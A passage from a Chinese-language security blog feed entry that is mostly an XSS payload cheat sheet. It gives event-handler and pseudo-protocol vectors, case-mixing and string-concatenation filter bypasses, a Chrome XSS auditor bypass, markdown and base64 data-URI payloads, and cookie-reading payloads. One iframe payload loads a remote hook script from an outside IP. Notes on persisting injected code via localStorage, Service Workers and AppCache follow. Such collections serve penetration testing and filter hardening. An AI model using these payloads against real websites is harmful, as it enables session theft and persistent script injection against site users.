&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;svg onload=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=document.domain onerror=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;M onmouseover=alert(document.domain)&amp;gt;M&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;marquee onscroll=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:alert(document.domain)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;body onload=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;details open ontoggle=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;embed src=javascript:alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;大小写绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#大小写绕过&#34;&gt;#&lt;/a&gt; 大小写绕过&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;sCrIpT&amp;gt;alert(1)&amp;lt;/sCrIpT&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;ScRiPt&amp;gt;alert(1)&amp;lt;/ScRiPt&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;sCrIpT&amp;gt;alert(1)&amp;lt;/ScRiPt&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;ScRiPt&amp;gt;alert(1)&amp;lt;/sCrIpT&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iMg src=1 oNeRrOr=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;ImG src=1 OnErRoR=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=1 onerror=&amp;quot;alert(&amp;quot;M&amp;quot;)&amp;quot;&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;marquee onscroll=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;mArQuEe OnScRoLl=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;MaRqUeE oNsCrOlL=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;各种alert&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#各种alert&#34;&gt;#&lt;/a&gt; 各种 alert&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;confirm(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;prompt(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;1&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;1&amp;quot;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert&lt;/code&gt; 1 &lt;code&gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;(alert)(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;a=alert,a(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;[1].find(alert)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;top[&amp;quot;al&amp;quot;+&amp;quot;ert&amp;quot;](1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;top[&amp;quot;a&amp;quot;+&amp;quot;l&amp;quot;+&amp;quot;e&amp;quot;+&amp;quot;r&amp;quot;+&amp;quot;t&amp;quot;](1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;top[/al/.source+/ert/.source](1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;伪协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#伪协议&#34;&gt;#&lt;/a&gt; 伪协议&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:/0/,alert(%22M%22)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:/00/,alert(%22M%22)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:/000/,alert(%22M%22)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:/M/,alert(%22M%22)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chrome-xss-auditor-bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#chrome-xss-auditor-bypass&#34;&gt;#&lt;/a&gt; Chrome XSS auditor bypass&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;?param=https://&amp;amp;param=@z.exeye.io/import%20rel=import%3E&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;base href=javascript:/M/&amp;gt;&amp;lt;a href=,alert(1)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;base href=javascript:/M/&amp;gt;&amp;lt;iframe src=,alert(1)&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;长度限制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#长度限制&#34;&gt;#&lt;/a&gt; 长度限制&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;s+=&amp;quot;l&amp;quot;&amp;lt;/script&amp;gt;
\...
&amp;lt;script&amp;gt;eval(s)&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;jquery-sourcemappingurl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jquery-sourcemappingurl&#34;&gt;#&lt;/a&gt; jquery sourceMappingURL&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;/textarea&amp;gt;&amp;lt;script&amp;gt;var a=1//@ sourceMappingURL=//xss.site&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;图片名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#图片名&#34;&gt;#&lt;/a&gt; 图片名&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=alert(document.cookie)&amp;gt;.gif
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;过期的payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过期的payload&#34;&gt;#&lt;/a&gt; 过期的 payload&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;src=javascript:alert 基本不可以用&lt;/li&gt;
&lt;li&gt;css expression 特性只在旧版本 ie 可用&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;css&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#css&#34;&gt;#&lt;/a&gt; css&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div style=&amp;quot;background-image:url(javascript:alert(/xss/))&amp;quot;&amp;gt;
&amp;lt;STYLE&amp;gt;@import&#39;http://ha.ckers.org/xss.css&#39;;&amp;lt;/STYLE&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;markdown&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#markdown&#34;&gt;#&lt;/a&gt; markdown&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;[a](javascript:prompt(document.cookie))
[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
&amp;lt;&amp;amp;#x6A&amp;amp;#x61&amp;amp;#x76&amp;amp;#x61&amp;amp;#x73&amp;amp;#x63&amp;amp;#x72&amp;amp;#x69&amp;amp;#x70&amp;amp;#x74&amp;amp;#x3A&amp;amp;#x61&amp;amp;#x6C&amp;amp;#x65&amp;amp;#x72&amp;amp;#x74&amp;amp;#x28&amp;amp;#x27&amp;amp;#x58&amp;amp;#x53&amp;amp;#x53&amp;amp;#x27&amp;amp;#x29&amp;gt;
![a&#39;&amp;quot;`onerror=prompt(document.cookie)](x)
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;iframe-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iframe-2&#34;&gt;#&lt;/a&gt; iframe&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;iframe onload=&#39;
    var sc   = document.createElement(&amp;quot;scr&amp;quot; + &amp;quot;ipt&amp;quot;);
    sc.type  = &amp;quot;text/javascr&amp;quot; + &amp;quot;ipt&amp;quot;;
    sc.src   = &amp;quot;http://1.2.3.4/js/hook.js&amp;quot;;
    document.body.appendChild(sc);
    &#39;
/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=javascript:alert(1)&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=&amp;quot;data:text/html,&amp;lt;iframe src=javascript:alert(&#39;M&#39;)&amp;gt;&amp;lt;/iframe&amp;gt;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe srcdoc=&amp;lt;svg/onload=alert(1)&amp;gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=https://baidu.com width=1366 height=768&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=javascript:alert(1) width=1366 height=768&amp;gt;&amp;lt;/iframe&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;form&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#form&#34;&gt;#&lt;/a&gt; form&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form action=javascript:alert(1)&amp;gt;&amp;lt;input type=submit&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form&amp;gt;&amp;lt;button formaction=javascript:alert(1)&amp;gt;M&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form&amp;gt;&amp;lt;input formaction=javascript:alert(1) type=submit value=M&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form&amp;gt;&amp;lt;input formaction=javascript:alert(1) type=image value=M&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form&amp;gt;&amp;lt;input formaction=javascript:alert(1) type=image src=1&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;meta&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#meta&#34;&gt;#&lt;/a&gt; meta&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;META HTTP-EQUIV=&amp;quot;Link&amp;quot; Content=&amp;quot;&amp;lt;http://ha.ckers.org/xss.css&amp;gt;; REL=stylesheet&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;持久化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#持久化&#34;&gt;#&lt;/a&gt; 持久化&lt;/h1&gt;
&lt;h2 id=&#34;基于存储&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于存储&#34;&gt;#&lt;/a&gt; 基于存储&lt;/h2&gt;
&lt;p&gt;有时候网站会将信息存储在 Cookie 或 localStorage，而因为这些数据一般是网站主动存储的，很多时候没有对 Cookie 或 localStorage 中取出的数据做过滤，会直接将其取出并展示在页面中，甚至存了 JSON 格式的数据时，部分站点存在  &lt;code&gt;eval(data)&lt;/code&gt;  之类的调用。因此当有一个 XSS 时，可以把 payload 写入其中，在对应条件下触发。&lt;/p&gt;
&lt;p&gt;在一些条件下，这种利用方式可能因为一些特殊字符造成问题，可以使用  &lt;code&gt;String.fromCharCode&lt;/code&gt;  来绕过。&lt;/p&gt;
&lt;h2 id=&#34;service-worker&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#service-worker&#34;&gt;#&lt;/a&gt; Service Worker&lt;/h2&gt;
&lt;p&gt;Service Worker 可以拦截 http 请求，起到类似本地代理的作用，故可以使用 Service Worker Hook 一些请求，在请求中返回攻击代码，以实现持久化攻击的目的。&lt;/p&gt;
&lt;p&gt;在 Chrome 中，可通过  &lt;code&gt;chrome://inspect/#service-workers&lt;/code&gt;  来查看 Service Worker 的状态，并进行停止。&lt;/p&gt;
&lt;h2 id=&#34;appcache&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#appcache&#34;&gt;#&lt;/a&gt; AppCache&lt;/h2&gt;
&lt;p&gt;在可控的网络环境下（公共 wifi），可以使用 AppCache 机制，来强制存储一些 Payload，未清除的情况下，用户访问站点时对应的 payload 会一直存在。&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h2 id=&#34;wiki&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wiki&#34;&gt;#&lt;/a&gt; wiki&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1VsdGltYXRlSGFja2Vycy9Bd2Vzb21lWFNT&#34;&gt;AwesomeXSS&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93M2MuZ2l0aHViLmlvL3dlYmFwcHNlYy1jc3Av&#34;&gt;w3c&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3dpc2VjL2RvbXhzc3dpa2kvd2lraQ==&#34;&gt;dom xss wiki&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jb250ZW50LXNlY3VyaXR5LXBvbGljeS5jb20v&#34;&gt;content-security-policy.com&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zaHVicy5pby9leHBsb2l0aW5nLW1hcmtkb3duLXN5bnRheC1hbmQtdGVsZXNjb3BlLXBlcnNpc3RlbnQteHNzLXRocm91Z2gtbWFya2Rvd24tY3ZlLTIwMTQtNTE0NC8=&#34;&gt;markdwon xss&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9icnV0ZWxvZ2ljLmNvbS5ici9ibG9nL2NoZWF0LXNoZWV0Lw==&#34;&gt;xss cheat sheet&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9odG1sNXNlYy5vcmcv&#34;&gt;html5 security cheatsheet&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubmV0c3Bhcmtlci5jb20vd2hpdGVwYXBlci1odHRwLXNlY3VyaXR5LWhlYWRlcnMv&#34;&gt;http security headers&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1My9YU1NDaGFsbGVuZ2VXaWtpL3dpa2k=&#34;&gt;XSSChallengeWiki&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;challenges&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#challenges&#34;&gt;#&lt;/a&gt; Challenges&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94c3MtZ2FtZS5hcHBzcG90LmNvbS8=&#34;&gt;XSS Challenge By Google&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Byb21wdC5tbC8w&#34;&gt;prompt to win&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;css-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#css-2&#34;&gt;#&lt;/a&gt; CSS&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy50aGVzcGFubmVyLmNvLnVrLzIwMTQvMDMvMjEvcnBvLw==&#34;&gt;rpo&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy56amljbWlzYS5vcmcvaW5kZXgucGhwL2FyY2hpdmVzLzEyNy8=&#34;&gt;rpo 攻击初探&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdXJlc2VjLmNvbS9ibG9nL2FydGljbGUvYmxvZy9SZWFkaW5nLURhdGEtdmlhLUNTUy1JbmplY3Rpb24tMTgwLmh0bWw=&#34;&gt;Reading Data via CSS&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21rc2Jlbi5sMC5jbS8yMDE1LzEwL2Nzcy1iYXNlZC1hdHRhY2stYWJ1c2luZy11bmljb2RlLXJhbmdlLmh0bWw=&#34;&gt;css based attack abusing unicode range&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vbG10X3N3YWxsb3cvY3NzLWluamVjdGlvbi1wbHVzLXBsdXMtamktY3VuLXNob3UtZmEtZmFsc2VnYWktZ3Vhbi10b2R1aS1jZQ==&#34;&gt;css injection&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLnNoZWRkb3cueHl6L2Nzcy10aW1pbmctYXR0YWNrLw==&#34;&gt;css timing attack&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;同源策略-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#同源策略-2&#34;&gt;#&lt;/a&gt; 同源策略&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvU2VjdXJpdHkvU2FtZS1vcmlnaW5fcG9saWN5&#34;&gt;Same origin policy&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmVkZWZlbmRlZC5jb20vcGFwZXJzL2NvcnMtc2VjdXJpdHktZ3VpZGU=&#34;&gt;cors security guide&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vc2hobmprL2xvZ2ljYWxseS1ieXBhc3NpbmctYnJvd3Nlci1zZWN1cml0eS1ib3VuZGFyaWVz&#34;&gt;logically bypassing browser security boundaries&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;bypass-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypass-2&#34;&gt;#&lt;/a&gt; bypass&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vSm9oYW5uZXNIb3BwZS81NjEyMjc0&#34;&gt;666 lines of xss payload&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21hc2F0b2tpbnVnYXdhL2ZpbHRlcmJ5cGFzcw==&#34;&gt;xss auditor bypass&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vSFRNTC9jaHJvbWUteHNzLWF1ZGl0b3ItYnlwYXNzLWNvbGxlY3Rpb24uaHRtbA==&#34;&gt;xss auditor bypass writeup&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9ieXBhc3NpbmctY3NwLXVzaW5nLXBvbHlnbG90LWpwZWdz&#34;&gt;bypassing csp using polyglot jpegs&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2VjanVpY2UuY29tL2J5cGFzcy14c3MtZmlsdGVycy11c2luZy1qYXZhc2NyaXB0LWdsb2JhbC12YXJpYWJsZXMv&#34;&gt;bypass xss filters using javascript global variables&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;持久化-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#持久化-2&#34;&gt;#&lt;/a&gt; 持久化&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Ryb3BzLndvb3l1bi5vcmcvd2ViLzEwNzk4&#34;&gt;变种 XSS 持久控制 by tig3r&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zYWt1cml0eS5jb20vYmxvZy8yMDE1LzA4LzEzL21pZGRsZWtpdC5odG1s&#34;&gt;Using Appcache and ServiceWorker for Evil&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tricks&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tricks&#34;&gt;#&lt;/a&gt; Tricks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2V0aGVyZHJlYW0vc3ctc2Vj&#34;&gt;Service Worker 安全探索&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0V0aGVyRHJlYW0vd2ViLWZyb250ZW5kLW1hZ2lj&#34;&gt;前端黑魔法&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
        <category term="网络安全" />
        <category term="XSS" />
        <category term="漏洞" />
        <updated>2022-11-26T03:55:09.000Z</updated>
    </entry>
</feed>
